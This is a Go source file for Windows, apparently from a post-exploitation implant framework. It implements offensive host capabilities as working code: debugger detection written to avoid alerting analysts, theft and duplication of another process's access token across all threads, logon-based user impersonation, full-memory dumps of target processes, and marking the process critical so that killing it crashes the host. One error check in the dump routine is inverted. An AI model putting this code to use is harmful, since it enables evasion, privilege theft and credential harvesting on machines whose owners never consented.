//go:build windows

package device

import (
	"io"
	"os"
	"runtime"
	"runtime/debug"
	"strings"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/device/winapi"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// ErrNoNix is an error that is returned when a Windows device attempts a *nix
// specific function.
var ErrNoNix = xerr.Sub("only supported on *nix devices", 0xFB)

type file interface {
	File() (*os.File, error)
}
type fileFd interface {
	Fd() uintptr
}

// GoExit attempts to walk through the process threads and will forcefully
// kill all Golang based OS-Threads based on their starting address (which
// should be the same when starting from CGo).
//
// This will attempt to determine the base thread and any children that may be
// running and take action on what type of host we're in to best end the
// runtime without crashing.
//
// This function can be used on binaries, shared libaries or Zombified processes.
//
// Only works on Windows devices and is a a wrapper for 'syscall.Exit(0)' for
// *nix devices.
//
// DO NOT EXPECT ANYTHING (INCLUDING DEFERS) TO HAPPEN AFTER THIS FUNCTION.
func GoExit() {
	winapi.KillRuntime()
}

// FreeOSMemory forces a garbage collection followed by an
// attempt to return as much memory to the operating system
// as possible. (Even if this is not called, the runtime gradually
// returns memory to the operating system in a background task.)
//
// On Windows, this function also calls 'SetProcessWorkingSetSizeEx(-1, -1, 0)'
// to force the OS to clear any free'd pages.
func FreeOSMemory() {
	debug.FreeOSMemory()
	winapi.EmptyWorkingSet()
}

// IsDebugged returns true if the current process is attached by a debugger.
func IsDebugged() bool {
	// Try to open the DLLs first, so we don't alert to our attempts to detect
	// a debugger.
	if len(debugDlls) > 0 {
		for _, v := range strings.Split(debugDlls, "\n") {
			if winapi.CheckDebugWithLoad(v) {
				return true
			}
		}
	}
	if winapi.IsDebuggerPresent() {
		return true
	}
	// 0x400 - PROCESS_QUERY_INFORMATION
	h, err := winapi.OpenProcess(0x400, false, winapi.GetCurrentProcessID())
	if err != nil {
		return false
	}
	var d bool
	err = winapi.CheckRemoteDebuggerPresent(h, &d)
	winapi.CloseHandle(h)
	return err == nil && d
}
func proxyInit() *config {
	var (
		i   winapi.ProxyInfo
		err = winapi.WinHTTPGetDefaultProxyConfiguration(&i)
	)
	if err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("device.proxyInit(): Retriving proxy info failed, falling back to no proxy: %s", err)
		}
		return nil
	}
	if i.AccessType < 3 || (i.Proxy == nil && i.ProxyBypass == nil) {
		return nil
	}
	var (
		v = winapi.UTF16PtrToString(i.Proxy)
		b = winapi.UTF16PtrToString(i.ProxyBypass)
	)
	if len(v) == 0 && len(b) == 0 {
		return nil
	}
	var c config
	if i := split(b); len(i) > 0 {
		c.NoProxy = strings.Join(i, ",")
	}
	for _, x := range split(v) {
		if len(x) == 0 {
			continue
		}
		q := strings.IndexByte(x, '=')
		if q > 3 {
			if (x[0] != 'h' && x[0] != 'H') || (x[1] != 't' && x[1] != 'T') || (x[2] != 't' && x[2] != 'T') || (x[3] != 'p' && x[3] != 'P') {
				continue
			}
			if q == 4 {
				c.HTTPProxy = x[q+1:]
			}
			if x[4] != 's' && x[4] != 'S' {
				continue
			}
			if q > 5 {
				continue
			}
			c.HTTPSProxy = x[q+1:]
			continue
		}
		if len(c.HTTPProxy) == 0 {
			c.HTTPProxy = x
		}
		if len(c.HTTPSProxy) == 0 {
			c.HTTPSProxy = x
		}
	}
	if bugtrack.Enabled {
		bugtrack.Track(
			"devtools.proxyInit(): Proxy info c.HTTPProxy=%s, c.HTTPSProxy=%s, c.NoProxy=%s",
			c.HTTPProxy, c.HTTPSProxy, c.NoProxy,
		)
	}
	return &c
}

// RevertToSelf function terminates the impersonation of a client application.
// Returns an error if no impersonation is being done.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func RevertToSelf() error {
	// Revert
	winapi.RevertToSelf()
	// THEN set tokens to nil.
	return winapi.ForEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, 0) })
}
func split(s string) []string {
	if len(s) == 0 {
		return nil
	}
	if len(s) == 1 {
		return []string{s}
	}
	var (
		r []string
		x int
	)
	for i := 1; i < len(s); i++ {
		if s[i] != ';' && s[i] != ' ' {
			continue
		}
		if x == i {
			continue
		}
		for ; x < i && (s[x] == ';' || s[x] == ' '); x++ {
		}
		if x == i {
			continue
		}
		r = append(r, s[x:i])
		if x = i + 1; x > len(s) {
			break
		}
		for ; x < len(s) && (s[x] == ';' || s[x] == ' '); x++ {
		}
		i = x
	}
	if x == 0 && len(r) == 0 {
		return []string{s}
	}
	if x < len(s) {
		r = append(r, s[x:])
	}
	return r
}

// Mounts attempts to get the mount points on the local device.
//
// On Windows devices, this is the drive letters avaliable, otherwise on nix*
// systems, this will be the mount points on the system.
//
// The return result (if no errors occurred) will be a string list of all the
// mount points (or Windows drive letters).
func Mounts() ([]string, error) {
	d, err := winapi.GetLogicalDrives()
	if err != nil {
		return nil, xerr.Wrap("GetLogicalDrives", err)
	}
	m := make([]string, 0, 26)
	for i := 0; i < 26; i++ {
		if (d & (1 << i)) == 0 {
			continue
		}
		m = append(m, string(rune('A'+i))+":\\")
	}
	return m, nil
}

// SetProcessName will attempt to overrite the process name on *nix systems
// by overwriting the argv block.
//
// Returns 'ErrNoNix' on Windows devices.
//
// Found here: https://stackoverflow.com/questions/14926020/setting-process-name-as-seen-by-ps-in-go
func SetProcessName(s string) error {
	return ErrNoNix
}

// SetCritical will set the critical flag on the current process. This function
// requires administrative privileges and will attempt to get the
// "SeDebugPrivilege" first before running.
//
// If successful, "critical" processes will BSOD the host when killed or will
// be prevented from running.
//
// The boolean returned is the last Critical status. It's set to True if the
// process was already marked as critical.
//
// Use this function with "false" to disable the critical flag.
//
// NOTE: THIS MUST BE DISABED ON PROCESS EXIT OTHERWISE THE HOST WILL BSOD!!!
//
// Any errors when setting or obtaining privileges will be returned.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func SetCritical(c bool) (bool, error) {
	if err := winapi.GetDebugPrivilege(); err != nil {
		return false, err
	}
	return winapi.RtlSetProcessIsCritical(c)
}

// Impersonate attempts to steal the Token in use by the target process of the
// supplied filter.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
func Impersonate(f *filter.Filter) error {
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	// 0x2000F - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) | TOKEN_ASSIGN_PRIMARY
	//            TOKEN_DUPLICATE | TOKEN_IMPERSONATE
	// NOTE(dij): Might need to change this to "0x200EF" which adds "TOKEN_WRITE"
	//            access. Also not sure if we need "TOKEN_IMPERSONATE" or "TOKEN_ASSIGN_PRIMARY"
	//            as we're duplicating it.
	x, err := f.TokenFunc(0x2000F, nil)
	if err != nil {
		return err
	}
	// NOTE(dij): This function call handles differently than the 'ImpersonateUser'
	//            function. It seems only user tokens can be used for delegation
	//            and we should instead use this to impersonate a in-process token
	//            instead and copy it to all running threads, as most likely it has
	//            more rights than we currently have.
	var y uintptr
	// 0x2000000 - MAXIMUM_ALLOWED
	// 0x2       - SecurityImpersonation
	// 0x2       - TokenImpersonation
	err = winapi.DuplicateTokenEx(x, 0x2000000, nil, 2, 2, &y)
	if winapi.CloseHandle(x); err != nil {
		return err
	}
	err = winapi.ForEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, y) })
	winapi.CloseHandle(y)
	return err
}

// ImpersonateUser attempts to login with the supplied credentials and impersonate
// the logged in account.
//
// This will set the permissions of all threads in use by the runtime. Once work
// has completed, it is recommended to call the 'RevertToSelf' function to
// revert the token changes.
//
// This impersonation is network based, unlike impersonating a Process token.
// (Windows-only, would be cool to do a *nix one).
func ImpersonateUser(user, domain, pass string) error {
	// NOTE(dij): Do we need to do this?
	//  AdjustPrivileges("SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege")
	// 0x9 - LOGON32_LOGON_NEW_CREDENTIALS
	x, err := winapi.LoginUser(user, domain, pass, 0x9, 0)
	if err != nil {
		return err
	}
	runtime.LockOSThread()
	// NOTE(dij): For best results, we FIRST impersonate the token, THEN
	//            we try to set the token to each user thread with a duplicated
	//            token set to impersonate. (Similar to an Impersonate call).
	err = winapi.ImpersonateLoggedOnUser(x)
	if winapi.CloseHandle(x); err != nil {
		runtime.UnlockOSThread()
		return err
	}
	var y uintptr
	// 0xF01FF - TOKEN_ALL_ACCESS
	if err = winapi.OpenThreadToken(winapi.CurrentThread, 0xF01FF, false, &y); err != nil {
		runtime.UnlockOSThread()
		return err
	}
	err = winapi.ForEachThread(func(t uintptr) error { return winapi.SetThreadToken(&t, y) })
	winapi.CloseHandle(y)
	runtime.UnlockOSThread()
	return err
}

// DumpProcess will attempt to copy the memory of the targeted Filter to the
// supplied Writer. This fill select the first process that matches the Filter.
//
// Warning! This suspends the process, you cannot dump the same owning PID.
//
// If the Filter is nil or empty or if an error occurs during reading/writing
// an error will be returned.
func DumpProcess(f *filter.Filter, w io.Writer) error {
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	if err := winapi.GetDebugPrivilege(); err != nil {
		return err
	}
	// 0x450 - PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE
	h, err := f.HandleFunc(0x450, nil)
	if err != nil {
		return err
	}
	p, err := winapi.GetProcessID(h)
	if err != nil {
		winapi.CloseHandle(h)
		return err
	}
	if p == winapi.GetCurrentProcessID() {
		winapi.CloseHandle(h)
		return xerr.Sub("cannot dump self", 0x91)
	}
	if v, ok := w.(fileFd); ok {
		// 0x2 - MiniDumpWithFullMemory
		err = winapi.MiniDumpWriteDump(h, p, v.Fd(), 0x2, nil)
		winapi.CloseHandle(h)
		return err
	}
	if v, ok := w.(file); ok {
		x, err := v.File()
		if err == nil {
			winapi.CloseHandle(h)
			return err
		}
		// 0x2 - MiniDumpWithFullMemory
		err = winapi.MiniDumpWriteDump(h, p, x.Fd(), 0x2, nil)
		winapi.CloseHandle(h)
		return err
	}
	// 0x2 - MiniDumpWithFullMemory
	err = winapi.MiniDumpWriteDump(h, p, 0, 0x2, w)
	winapi.CloseHandle(h)
	runtime.GC()
	FreeOSMemory()
	return err
}
